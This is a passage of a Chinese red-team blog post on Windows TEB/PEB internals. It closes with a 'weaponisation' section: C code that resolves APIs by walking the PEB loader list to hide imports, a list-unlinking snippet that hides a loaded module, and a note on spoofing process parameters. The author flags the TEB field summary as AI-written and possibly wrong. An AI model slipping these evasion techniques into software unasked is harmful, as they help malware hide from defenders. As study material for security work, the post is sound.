&#x2F;&#x2F;0xb0</span><br><span class=\"line\">    VOID* ParentDllBase;                                                    &#x2F;&#x2F;0xb8</span><br><span class=\"line\">    VOID* SwitchBackContext;                                                &#x2F;&#x2F;0xc0</span><br><span class=\"line\">    struct _RTL_BALANCED_NODE BaseAddressIndexNode;                         &#x2F;&#x2F;0xc8</span><br><span class=\"line\">    struct _RTL_BALANCED_NODE MappingInfoIndexNode;                         &#x2F;&#x2F;0xe0</span><br><span class=\"line\">    ULONGLONG OriginalBase;                                                 &#x2F;&#x2F;0xf8</span><br><span class=\"line\">    union _LARGE_INTEGER LoadTime;                                          &#x2F;&#x2F;0x100</span><br><span class=\"line\">    ULONG BaseNameHashValue;                                                &#x2F;&#x2F;0x108</span><br><span class=\"line\">    enum _LDR_DLL_LOAD_REASON LoadReason;                                   &#x2F;&#x2F;0x10c</span><br><span class=\"line\">    ULONG ImplicitPathOptions;                                              &#x2F;&#x2F;0x110</span><br><span class=\"line\">    ULONG ReferenceCount;                                                   &#x2F;&#x2F;0x114</span><br><span class=\"line\">    ULONG DependentLoadFlags;                                               &#x2F;&#x2F;0x118</span><br><span class=\"line\">    UCHAR SigningLevel;                                                     &#x2F;&#x2F;0x11c</span><br><span class=\"line\">&#125;; </span><br></pre></td></tr></table></figure>\n\n<p>三个链表记录加载模块的顺序如下：</p>\n<p>InLoadOrderModuleList </p>\n<blockquote>\n<p>notepad.exe - ntdll.dll - kernel32.dll - kernelbase.dll</p>\n</blockquote>\n<p>InMemoryOrderModuleList </p>\n<blockquote>\n<p>notepad.exe - ntdll.dll - kernel32.dll - kernelbase.dll</p>\n</blockquote>\n<p>InInitializationOrderModuleList</p>\n<blockquote>\n<p>ntdll.dll - kernelbase.dll - kernel32.dll</p>\n</blockquote>\n<h2 id=\"TEB\"><a href=\"#TEB\" class=\"headerlink\" title=\"TEB\"></a>TEB</h2><p>在用户模式中存在 线程环境块（Thread Environment Block），每个线程都具有一个独立的TEB，它存储了与单个线程相关的特定信息，例如 线程ID (TID)、线程的栈基址和栈顶限制、指向线程局部存储 (Thread Local Storage, TLS) 的指针。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; AI总结TEB结构成员意义，未必正确</span><br><span class=\"line\"></span><br><span class=\"line\">0x0 - 0x38: NT_TIB</span><br><span class=\"line\">NtTib - 包含异常链表、堆栈边界、线程信息块核心指针，用于结构化异常处理和栈管理</span><br><span class=\"line\"></span><br><span class=\"line\">0x38 - 0x60: 环境与线程标识</span><br><span class=\"line\">EnvironmentPointer - 指向环境变量块</span><br><span class=\"line\">ClientId - 线程和进程 ID</span><br><span class=\"line\">ActiveRpcHandle - 活动 RPC 会话句柄</span><br><span class=\"line\">ThreadLocalStoragePointer - TLS 基址</span><br><span class=\"line\">ProcessEnvironmentBlock - 指向所属进程的 PEB</span><br><span class=\"line\"></span><br><span class=\"line\">0x68 - 0x108: 状态与保留字段</span><br><span class=\"line\">LastErrorValue - 上一次调用 SetLastError&#x2F;Win32 API 的错误码</span><br><span class=\"line\">CountOfOwnedCriticalSections - 线程拥有的临界区数量</span><br><span class=\"line\">CsrClientThread - CSR 服务器客户端线程指针</span><br><span class=\"line\">Win32ThreadInfo - Win32 子系统线程信息</span><br><span class=\"line\">User32Reserved &#x2F; UserReserved - User32 和用户保留区</span><br><span class=\"line\">WOW32Reserved - WOW64 子系统保留</span><br><span class=\"line\">CurrentLocale - 当前线程区域设置</span><br><span class=\"line\">FpSoftwareStatusRegister - 浮点状态寄存器模拟标志</span><br><span class=\"line\"></span><br><span class=\"line\">0x110 - 0x290: 调试和占位相关</span><br><span class=\"line\">ReservedForDebuggerInstrumentation - 调试器使用的保留指针数组</span><br><span class=\"line\">SystemReserved1 - 系统保留</span><br><span class=\"line\">PlaceholderCompatibilityMode &#x2F; PlaceholderHydrationAlwaysExplicit &#x2F; PlaceholderReserved - 占位兼容模式和保留</span><br><span class=\"line\">ProxiedProcessId - 被代理的进程 ID</span><br><span class=\"line\">_ActivationStack - 激活上下文栈信息</span><br><span class=\"line\">WorkingOnBehalfTicket - 权限代理票据</span><br><span class=\"line\"></span><br><span class=\"line\">0x2c0 - 0x2e8: 异常与上下文</span><br><span class=\"line\">ExceptionCode - 线程异常代码</span><br><span class=\"line\">ActivationContextStackPointer - 当前激活上下文栈指针</span><br><span class=\"line\">InstrumentationCallbackSp&#x2F;Pc&#x2F;PreviousSp - 仿真&#x2F;回调上下文保存</span><br><span class=\"line\">TxFsContext - 事务性文件系统上下文</span><br><span class=\"line\">InstrumentationCallbackDisabled - 仿真回调是否禁用</span><br><span class=\"line\">UnalignedLoadStoreExceptions - 未对齐访问异常标志</span><br><span class=\"line\"></span><br><span class=\"line\">0x2f0 - 0x7f8: GDI 与客户端信息</span><br><span class=\"line\">GdiTebBatch - 批量 GDI 绘图缓存</span><br><span class=\"line\">RealClientId - 实际线程和进程 ID</span><br><span class=\"line\">GdiCachedProcessHandle &#x2F; GdiClientPID &#x2F; GdiClientTID - GDI 相关缓存</span><br><span class=\"line\">GdiThreadLocalInfo - 线程本地 GDI 信息</span><br><span class=\"line\">Win32ClientInfo - Win32 客户端信息数组</span><br><span class=\"line\"></span><br><span class=\"line\">0x9f0 - 0x1250: OpenGL 和状态</span><br><span class=\"line\">glDispatchTable &#x2F; glReserved1&#x2F;2 - OpenGL 调用表及保留</span><br><span class=\"line\">glSectionInfo, glSection, glTable - OpenGL 线程上下文</span><br><span class=\"line\">glCurrentRC &#x2F; glContext - 当前 OpenGL 渲染上下文</span><br><span class=\"line\">LastStatusValue - 上一次 NT API 状态返回值</span><br><span class=\"line\">StaticUnicodeString &#x2F; StaticUnicodeBuffer - 静态 Unicode 字符串缓存</span><br><span class=\"line\"></span><br><span class=\"line\">0x1478 - 0x1698: 堆栈与 TLS</span><br><span class=\"line\">DeallocationStack - 栈释放指针</span><br><span class=\"line\">TlsSlots - 线程局部存储槽</span><br><span class=\"line\">TlsLinks - TLS 链表，用于线程切换</span><br><span class=\"line\">Vdm - 虚拟 DOS 子系统指针</span><br><span class=\"line\">ReservedForNtRpc - NT RPC 保留</span><br><span class=\"line\">DbgSsReserved - 调试子系统保留</span><br><span class=\"line\">HardErrorMode - 严重错误处理模式</span><br><span class=\"line\">Instrumentation - 调试&#x2F;监控回调保留</span><br><span class=\"line\"></span><br><span class=\"line\">0x1710 - 0x1748: 活动、性能、GDI</span><br><span class=\"line\">ActivityId - 活动 GUID，用于事件追踪</span><br><span class=\"line\">SubProcessTag - 子进程标记</span><br><span class=\"line\">PerflibData &#x2F; EtwTraceData - 性能库和 ETW 事件数据</span><br><span class=\"line\">WinSockData - Winsock 数据</span><br><span class=\"line\">GdiBatchCount - GDI 批量计数</span><br><span class=\"line\">CurrentIdealProcessor &#x2F; IdealProcessorValue - 理想处理器编号</span><br><span class=\"line\">GuaranteedStackBytes - 最小栈保证</span><br><span class=\"line\"></span><br><span class=\"line\">0x1750 - 0x17e8: 线程池、TLS 扩展、语言与模拟</span><br><span class=\"line\">ReservedForPerf &#x2F; ReservedForOle - 性能和 OLE 保留</span><br><span class=\"line\">WaitingOnLoaderLock - 是否在等待 LoaderLock</span><br><span class=\"line\">SavedPriorityState - 保存线程优先级状态</span><br><span class=\"line\">ReservedForCodeCoverage - 代码覆盖工具使用</span><br><span class=\"line\">ThreadPoolData - 线程池信息</span><br><span class=\"line\">TlsExpansionSlots - TLS 扩展槽</span><br><span class=\"line\">DeallocationBStore &#x2F; BStoreLimit - 备用栈存储指针及限制</span><br><span class=\"line\">MuiGeneration - MUI 数据版本</span><br><span class=\"line\">IsImpersonating - 是否模拟用户</span><br><span class=\"line\">NlsCache - 本地化信息缓存</span><br><span class=\"line\">pShimData - 应用兼容性 Shim 数据</span><br><span class=\"line\">HeapData - 堆相关数据</span><br><span class=\"line\">CurrentTransactionHandle &#x2F; ActiveFrame - 事务处理句柄和上下文</span><br><span class=\"line\">FlsData - Fiber 本地存储</span><br><span class=\"line\">PreferredLanguages, UserPrefLanguages, MergedPrefLanguages - 线程语言首选项</span><br><span class=\"line\">MuiImpersonation - MUI 模拟状态</span><br><span class=\"line\">CrossTebFlags &#x2F; SameTebFlags - TEB 标志位，如 SafeThunkCall, InDebugPrint, InitialThread 等</span><br><span class=\"line\">TxnScopeEnterCallback &#x2F; TxnScopeExitCallback &#x2F; TxnScopeContext - 事务回调和上下文</span><br><span class=\"line\"></span><br><span class=\"line\">0x1808 - 0x1828: 资源与容器</span><br><span class=\"line\">LockCount - 线程锁计数</span><br><span class=\"line\">WowTebOffset - WOW64 TEB 偏移</span><br><span class=\"line\">ResourceRetValue - 资源返回值缓存</span><br><span class=\"line\">ReservedForWdf &#x2F; ReservedForCrt - WDF 和 CRT 保留</span><br><span class=\"line\">EffectiveContainerId - 有效容器 GUID(AppContainer 标识)</span><br></pre></td></tr></table></figure>\n\n<p>其中 ProcessEnvironmentBlock 即PEB，相对TEB地址偏移为：</p>\n<ul>\n<li>x86：0x30</li>\n<li>x64：0x60</li>\n</ul>\n<h1 id=\"获取PEB\"><a href=\"#获取PEB\" class=\"headerlink\" title=\"获取PEB\"></a>获取PEB</h1><p>windows设计了段寄存器来指向TEB地址，因此可以直接读取该值获取TEB地址，再通过偏移获取PEB地址</p>\n<ul>\n<li>x86 架构：<strong>FS 段寄存器</strong> 指向当前线程 TEB 的基址<ul>\n<li>FS:[0x18]：TEB 自身地址</li>\n<li>FS:[0x30]： 指向 PEB 的指针</li>\n</ul>\n</li>\n<li>x64 架构： <strong>GS 段寄存器</strong> 指向当前线程 TEB 的基址<ul>\n<li>GS:[0x30]: TEB 自身地址</li>\n<li>GS:[0x60]: 指向 PEB 的指针</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"汇编\"><a href=\"#汇编\" class=\"headerlink\" title=\"汇编\"></a>汇编</h2><p>x86直接使用汇编</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">__asm &#123;</span><br><span class=\"line\">    mov eax, fs:[0x30]</span><br><span class=\"line\">    mov pPeb, eax</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>x64默认无法使用汇编，需要新建asm文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">.CODE</span><br><span class=\"line\">    GetInInitializationOrderModuleList PROC</span><br><span class=\"line\">    mov rax,gs:[60h]</span><br><span class=\"line\">    ret</span><br><span class=\"line\">    GetInInitializationOrderModuleList ENDP</span><br><span class=\"line\">END</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"内联函数\"><a href=\"#内联函数\" class=\"headerlink\" title=\"内联函数\"></a>内联函数</h2><p>在 C 语言中，获取 PEB 的方法会因编译器而异。Visual Studio 在编译 64 位程序时不允许使用内联汇编，但提供了一些替代宏。而 GCC 则要求使用内联汇编</p>\n<ul>\n<li>x86：使用 <code>__readfsdword(offset)</code></li>\n<li>x64：使用 <code>__readgsqword(offset)</code></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;intrin.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">PTEB GetTEB(void) &#123;</span><br><span class=\"line\">#ifdef _M_IX86</span><br><span class=\"line\">    return (PTEB)__readfsdword(0x18);  &#x2F;&#x2F; FS:[0x18] &#x3D; Self</span><br><span class=\"line\">#elif defined(_M_X64)</span><br><span class=\"line\">    return (PTEB)__readgsqword(0x30);  &#x2F;&#x2F; GS:[0x30] &#x3D; Self</span><br><span class=\"line\">#else</span><br><span class=\"line\">    #error &quot;Unsupported architecture&quot;</span><br><span class=\"line\">#endif</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">PPEB GetPEB(void) &#123;</span><br><span class=\"line\">#ifdef _M_IX86</span><br><span class=\"line\">    return (PPEB)__readfsdword(0x30);  &#x2F;&#x2F; FS:[0x30] &#x3D; PEB指针</span><br><span class=\"line\">#elif defined(_M_X64)</span><br><span class=\"line\">    return (PPEB)__readgsqword(0x60);  &#x2F;&#x2F; GS:[0x60] &#x3D; PEB指针</span><br><span class=\"line\">#else</span><br><span class=\"line\">    #error &quot;Unsupported architecture&quot;</span><br><span class=\"line\">#endif</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Win-API\"><a href=\"#Win-API\" class=\"headerlink\" title=\"Win API\"></a>Win API</h2><p>NtCurrentTeb、RtlGetCurrentPeb、NtQueryInformationProcess 获取PEB地址</p>\n<h1 id=\"武器化\"><a href=\"#武器化\" class=\"headerlink\" title=\"武器化\"></a>武器化</h1><p>在获取到PEB在内存中的地址后，可以通过修改结构体实现攻防对抗</p>\n<h2 id=\"动态API\"><a href=\"#动态API\" class=\"headerlink\" title=\"动态API\"></a>动态API</h2><p>获取PEB后通过Ldr结构定位加载的模块例如ntdll，解析导出表可以动态使用API函数，实现隐藏程序的IAT表</p>\n<p>peb.h，定义所需要的结构体</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#pragma once</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct _UNICODE_STRING &#123;</span><br><span class=\"line\">    USHORT Length;</span><br><span class=\"line\">    USHORT MaximumLength;</span><br><span class=\"line\">    PWSTR  Buffer;</span><br><span class=\"line\">&#125; UNICODE_STRING;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct _PEB &#123;</span><br><span class=\"line\">    UCHAR InheritedAddressSpace;                                            &#x2F;&#x2F;0x0</span><br><span class=\"line\">    UCHAR ReadImageFileExecOptions;                                         &#x2F;&#x2F;0x1</span><br><span class=\"line\">    UCHAR BeingDebugged;                                                    &#x2F;&#x2F;0x2</span><br><span class=\"line\">    union</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        UCHAR BitField;                                                     &#x2F;&#x2F;0x3</span><br><span class=\"line\">        struct</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            UCHAR ImageUsesLargePages : 1;                                    &#x2F;&#x2F;0x3</span><br><span class=\"line\">            UCHAR IsProtectedProcess : 1;                                     &#x2F;&#x2F;0x3</span><br><span class=\"line\">            UCHAR IsImageDynamicallyRelocated : 1;                            &#x2F;&#x2F;0x3</span><br><span class=\"line\">            UCHAR SkipPatchingUser32Forwarders : 1;                           &#x2F;&#x2F;0x3</span><br><span class=\"line\">            UCHAR IsPackagedProcess : 1;                                      &#x2F;&#x2F;0x3</span><br><span class=\"line\">            UCHAR IsAppContainer : 1;                                         &#x2F;&#x2F;0x3</span><br><span class=\"line\">            UCHAR IsProtectedProcessLight : 1;                                &#x2F;&#x2F;0x3</span><br><span class=\"line\">            UCHAR IsLongPathAwareProcess : 1;                                 &#x2F;&#x2F;0x3</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    UCHAR Padding0[4];                                                      &#x2F;&#x2F;0x4</span><br><span class=\"line\">    VOID* Mutant;                                                           &#x2F;&#x2F;0x8</span><br><span class=\"line\">    VOID* ImageBaseAddress;                                                 &#x2F;&#x2F;0x10</span><br><span class=\"line\">    struct _PEB_LDR_DATA* Ldr;                                              &#x2F;&#x2F;0x18</span><br><span class=\"line\">&#125; PEB, * PPEB;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct _PEB_LDR_DATA &#123;</span><br><span class=\"line\">    ULONG Length;                                                           &#x2F;&#x2F;0x0</span><br><span class=\"line\">    UCHAR Initialized;                                                      &#x2F;&#x2F;0x4</span><br><span class=\"line\">    VOID* SsHandle;                                                         &#x2F;&#x2F;0x8</span><br><span class=\"line\">    struct _LIST_ENTRY InLoadOrderModuleList;                               &#x2F;&#x2F;0x10</span><br><span class=\"line\">    struct _LIST_ENTRY InMemoryOrderModuleList;                             &#x2F;&#x2F;0x20</span><br><span class=\"line\">    struct _LIST_ENTRY InInitializationOrderModuleList;                     &#x2F;&#x2F;0x30</span><br><span class=\"line\">    VOID* EntryInProgress;                                                  &#x2F;&#x2F;0x40</span><br><span class=\"line\">    UCHAR ShutdownInProgress;                                               &#x2F;&#x2F;0x48</span><br><span class=\"line\">    VOID* ShutdownThreadId;                                                 &#x2F;&#x2F;0x50</span><br><span class=\"line\">&#125; PEB_LDR_DATA, * PPEB_LDR_DATA;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct _LDR_DATA_TABLE_ENTRY &#123;</span><br><span class=\"line\">    struct _LIST_ENTRY InLoadOrderLinks;                                    &#x2F;&#x2F;0x0</span><br><span class=\"line\">    struct _LIST_ENTRY InMemoryOrderLinks;                                  &#x2F;&#x2F;0x10</span><br><span class=\"line\">    struct _LIST_ENTRY InInitializationOrderLinks;                          &#x2F;&#x2F;0x20</span><br><span class=\"line\">    VOID* DllBase;                                                          &#x2F;&#x2F;0x30</span><br><span class=\"line\">    VOID* EntryPoint;                                                       &#x2F;&#x2F;0x38</span><br><span class=\"line\">    ULONG SizeOfImage;                                                      &#x2F;&#x2F;0x40</span><br><span class=\"line\">    struct _UNICODE_STRING FullDllName;                                     &#x2F;&#x2F;0x48</span><br><span class=\"line\">    struct _UNICODE_STRING BaseDllName;                                     &#x2F;&#x2F;0x58</span><br><span class=\"line\">&#125; LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure>\n\n<p>PEB.cpp</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\">#include &lt;peb.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">PPEB GetPeb() &#123;</span><br><span class=\"line\">#ifdef _WIN64</span><br><span class=\"line\">    return (PPEB)__readgsqword(0x60);</span><br><span class=\"line\">#else</span><br><span class=\"line\">    return (PPEB)__readfsdword(0x30);</span><br><span class=\"line\">#endif</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">LPVOID EnumModule(const wchar_t* target) &#123;</span><br><span class=\"line\">    LPVOID address &#x3D; nullptr;</span><br><span class=\"line\">    PPEB peb &#x3D; GetPeb();</span><br><span class=\"line\">    PPEB_LDR_DATA Ldr &#x3D; peb-&gt;Ldr;</span><br><span class=\"line\"></span><br><span class=\"line\">    _LIST_ENTRY* head &#x3D; &amp;Ldr-&gt;InLoadOrderModuleList;</span><br><span class=\"line\">    _LIST_ENTRY* current &#x3D; Ldr-&gt;InLoadOrderModuleList.Flink;</span><br><span class=\"line\"></span><br><span class=\"line\">    while (head !&#x3D; current) &#123;</span><br><span class=\"line\">        PLDR_DATA_TABLE_ENTRY ldr_data &#x3D; (PLDR_DATA_TABLE_ENTRY)current;</span><br><span class=\"line\">        printf(&quot;[*] name: %S base_address: %p\\n&quot;, ldr_data-&gt;BaseDllName.Buffer, ldr_data-&gt;DllBase);</span><br><span class=\"line\">        if (wcscmp(ldr_data-&gt;BaseDllName.Buffer, target) &#x3D;&#x3D; 0) &#123;</span><br><span class=\"line\">            address &#x3D; ldr_data-&gt;DllBase;</span><br><span class=\"line\">            printf(&quot;[!]Found module\\n&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        current &#x3D; current-&gt;Flink;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return address;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">FARPROC GetExportedFunctionAddress(LPVOID pBaseAddr, const char* functionName) &#123;</span><br><span class=\"line\">    PIMAGE_DOS_HEADER dosHeader &#x3D; (PIMAGE_DOS_HEADER)pBaseAddr;</span><br><span class=\"line\">    PIMAGE_NT_HEADERS ntHeaders &#x3D; (PIMAGE_NT_HEADERS)((BYTE*)pBaseAddr + dosHeader-&gt;e_lfanew);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 获取导出表 RVA (Relative Virtual Address)</span><br><span class=\"line\">    PIMAGE_EXPORT_DIRECTORY exportDir &#x3D; (PIMAGE_EXPORT_DIRECTORY)((BYTE*)pBaseAddr + ntHeaders-&gt;OptionalHeader.DataDirectory[0].VirtualAddress);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 获取名称表和地址表</span><br><span class=\"line\">    DWORD* nameRvas &#x3D; (DWORD*)((BYTE*)pBaseAddr + exportDir-&gt;AddressOfNames);</span><br><span class=\"line\">    DWORD* addrRvas &#x3D; (DWORD*)((BYTE*)pBaseAddr + exportDir-&gt;AddressOfFunctions);</span><br><span class=\"line\">    WORD* ordinals &#x3D; (WORD*)((BYTE*)pBaseAddr + exportDir-&gt;AddressOfNameOrdinals);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 遍历名称表，找到函数名</span><br><span class=\"line\">    for (DWORD i &#x3D; 0; i &lt; exportDir-&gt;NumberOfNames; ++i) &#123;</span><br><span class=\"line\">        &#x2F;&#x2F; 获取导出函数名</span><br><span class=\"line\">        char* exportedFuncName &#x3D; (char*)pBaseAddr + nameRvas[i];</span><br><span class=\"line\">        if (strcmp(exportedFuncName, functionName) &#x3D;&#x3D; 0) &#123;</span><br><span class=\"line\">            &#x2F;&#x2F; 找到函数，返回函数地址</span><br><span class=\"line\">            DWORD funcRva &#x3D; addrRvas[ordinals[i]];</span><br><span class=\"line\">            FARPROC funcAddr &#x3D; (FARPROC)((BYTE*)pBaseAddr + funcRva);</span><br><span class=\"line\">            return funcAddr;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return NULL;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    const wchar_t *target_module &#x3D; L&quot;ntdll.dll&quot;;</span><br><span class=\"line\">    LPVOID module_addr &#x3D; EnumModule(target_module);</span><br><span class=\"line\"></span><br><span class=\"line\">    FARPROC paddr &#x3D; GetExportedFunctionAddress(module_addr, &quot;NtCreateProcess&quot;);</span><br><span class=\"line\">    printf(&quot;[*]Addr from PEB: %p\\n&quot;, paddr);</span><br><span class=\"line\">    </span><br><span class=\"line\">    FARPROC ntaddr &#x3D; GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtCreateProcess&quot;);</span><br><span class=\"line\">    printf(&quot;[*]Addr from API: %p\\n&quot;, ntaddr);</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"模块隐藏\"><a href=\"#模块隐藏\" class=\"headerlink\" title=\"模块隐藏\"></a>模块隐藏</h2><p>同样通过Ldr结构修改链表，实现隐藏加载的模块。核心逻辑如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 我后面的下一个要指向我的下一个</span><br><span class=\"line\">ldr-&gt;InLoadOrderModuleList.Blink-&gt;Flink &#x3D; ldr-&gt;InLoadOrderModuleList.Flink;</span><br><span class=\"line\">&#x2F;&#x2F; 我下一个的后面要指向我的后面</span><br><span class=\"line\">ldr-&gt;InLoadOrderModuleList.Flink-&gt;Blink &#x3D; ldr-&gt;InLoadOrderModuleList.Blink;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"进程伪装\"><a href=\"#进程伪装\" class=\"headerlink\" title=\"进程伪装\"></a>进程伪装</h2><p>修改PEB结构体中ProcessParameters，实现伪装命令行参数、伪装启动路径等信息，结构体如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">struct _RTL_USER_PROCESS_PARAMETERS* ProcessParameters;                 &#x2F;&#x2F;0x20</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;0x440 bytes (sizeof)</span><br><span class=\"line\">struct _RTL_USER_PROCESS_PARAMETERS</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ULONG MaximumLength;                                                    &#x2F;&#x2F;0x0</span><br><span class=\"line\">    ULONG Length;                                                           &#x2F;&#x2F;0x4</span><br><span class=\"line\">    ULONG Flags;                                                            &#x2F;&#x2F;0x8</span><br><span class=\"line\">    ULONG DebugFlags;                                                       &#x2F;&#x2F;0xc</span><br><span class=\"line\">    VOID* ConsoleHandle;                                                    &#x2F;&#x2F;0x10</span><br><span class=\"line\">    ULONG ConsoleFlags;                                                     &#x2F;&#x2F;0x18</span><br><span class=\"line\">    VOID* StandardInput;                                                    &#x2F;&#x2F;0x20</span><br><span class=\"line\">    VOID* StandardOutput;                                                   &#x2F;&#x2F;0x28</span><br><span class=\"line\">    VOID* StandardError;                                                    &#x2F;&#x2F;0x30</span><br><span class=\"line\">    struct _CURDIR CurrentDirectory;                                        &#x2F;&#x2F;0x38</span><br><span class=\"line\">    struct _UNICODE_STRING DllPath;                                         &#x2F;&#x2F;0x50</span><br><span class=\"line\">    struct _UNICODE_STRING ImagePathName;                                   &#x2F;&#x2F;0x60</span><br><span class=\"line\">    struct _UNICODE_STRING CommandLine;                                     &#x2F;&#x2F;0x70</span><br><span class=\"line\">    VOID* Environment;                                                      &#x2F;&#x2F;0x80</span><br><span class=\"line\">    ULONG StartingX;                                                        &#x2F;&#x2F;0x88</span><br><span class=\"line\">    ULONG StartingY;                                                        &#x2F;&#x2F;0x8c</span><br><span class=\"line\">    ULONG CountX;                                                           &#x2F;&#x2F;0x90</span><br><span class=\"line\">    ULONG CountY;                                                           &#x2F;&#x2F;0x94</span><br><span class=\"line\">    ULONG CountCharsX;                                                      &#x2F;&#x2F;0x98</span><br><span class=\"line\">    ULONG CountCharsY;                                                      &#x2F;&#x2F;0x9c</span><br><span class=\"line\">    ULONG FillAttribute;                                                    &#x2F;&#x2F;0xa0</span><br><span class=\"line\">    ULONG WindowFlags;                                                      &#x2F;&#x2F;0xa4</span><br><span class=\"line\">    ULONG ShowWindowFlags;                                                  &#x2F;&#x2F;0xa8</span><br><span class=\"line\">    struct _UNICODE_STRING WindowTitle;                                     &#x2F;&#x2F;0xb0</span><br><span class=\"line\">    struct _UNICODE_STRING DesktopInfo;                                     &#x2F;&#x2F;0xc0</span><br><span class=\"line\">    struct _UNICODE_STRING ShellInfo;                                       &#x2F;&#x2F;0xd0</span><br><span class=\"line\">    struct _UNICODE_STRING RuntimeData;                                     &#x2F;&#x2F;0xe0</span><br><span class=\"line\">    struct _RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];                  &#x2F;&#x2F;0xf0</span><br><span class=\"line\">    ULONGLONG EnvironmentSize;                                              &#x2F;&#x2F;0x3f0</span><br><span class=\"line\">    ULONGLONG EnvironmentVersion;                                           &#x2F;&#x2F;0x3f8</span><br><span class=\"line\">    VOID* PackageDependencyData;                                            &#x2F;&#x2F;0x400</span><br><span class=\"line\">    ULONG ProcessGroupId;                                                   &#x2F;&#x2F;0x408</span><br><span class=\"line\">    ULONG LoaderThreads;                                                    &#x2F;&#x2F;0x40c</span><br><span class=\"line\">    struct _UNICODE_STRING RedirectionDllName;                              &#x2F;&#x2F;0x410</span><br><span class=\"line\">    struct _UNICODE_STRING HeapPartitionName;                               &#x2F;&#x2F;0x420</span><br><span class=\"line\">    ULONGLONG* DefaultThreadpoolCpuSetMasks;                                &#x2F;&#x2F;0x430</span><br><span class=\"line\">    ULONG DefaultThreadpoolCpuSetMaskCount;                                 &#x2F;&#x2F;0x438</span><br><span class=\"line\">    ULONG DefaultThreadpoolThreadMaximum;                                   &#x2F;&#x2F;0x43c</span><br><span class=\"line\">&#125;; </span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://www.vergiliusproject.com/\">https://www.vergiliusproject.com/</a></p>\n<p><a href=\"https://www.cnblogs.com/LittleHann/p/3453148.html\">《寒江独钓》内核学习笔记（2）</a></p>\n<p><a href=\"https://www.cnblogs.com/LittleHann/p/3454748.html\">《寒江独钓》内核学习笔记（3）</a></p>\n<p><a href=\"https://www.cnblogs.com/LittleHann/p/3454855.html\">《寒江独钓》内核学习笔记（4）</a></p>\n<p><a href=\"https://forum.butian.net/share/1526\">Peb小结</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/RTyafWl13djCI5ua6LFQ6w\">Windows安全攻防-PEB&amp;TEB</a></p>\n","categories":["Red-Team"]}]